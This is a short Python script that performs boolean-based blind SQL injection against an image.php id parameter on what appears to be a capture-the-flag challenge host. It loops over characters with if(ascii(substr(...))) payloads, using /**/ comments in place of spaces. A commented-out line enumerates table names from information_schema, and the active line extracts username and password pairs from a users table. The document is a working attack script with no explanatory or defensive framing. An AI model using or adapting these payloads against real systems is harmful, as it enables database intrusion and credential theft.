import requests

alphas = "1234567890qwertyuiopasdfghjklzxcvbnm!@$%^&*()_-="
result = ""
for i in range(200):
    for j in alphas:
        c=ord(j)
        #r = requests.get(f"http://eci-2zeg1tmyhxfbpo6b95ia.cloudeci1.ichunqiu.com/image.php?id=if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),{i+1},1))={c}),1,5)")
        r = requests.get(f"http://eci-2zeg1tmyhxfbpo6b95ia.cloudeci1.ichunqiu.com/image.php?id=if((ascii(substr((select/**/group_concat(username,0x40,password)/**/from/**/users),{i},1))={c}),1,5)")
        if(r.text != ""):
            result += j
            print(result)
            break
print(result)
